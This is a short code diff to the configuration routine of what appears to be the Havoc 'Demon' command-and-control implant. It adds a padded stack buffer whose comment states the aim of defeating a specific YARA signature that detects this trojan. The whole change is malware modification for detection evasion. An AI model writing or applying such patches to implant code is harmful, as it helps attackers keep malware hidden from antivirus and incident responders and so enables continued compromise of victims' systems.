@@ -578,6 +578,12 @@ VOID DemonConfig()
     UINT32 Length = 0;
     DWORD  J      = 0;
 
+    /* Stack frame padding — changes compiled frame size to evade
+     * YARA rule Windows_Trojan_Havoc_88053562 which signatures
+     * the specific 0x4F8 sub rsp pattern of this function. */
+    volatile BYTE _framepad[0x40];
+    _framepad[0] = 0;
+
     PRINTF( "Config Size: %d\n", sizeof( AgentConfig ) )
 
     ParserNew( &Parser, AgentConfig, sizeof( AgentConfig ) );
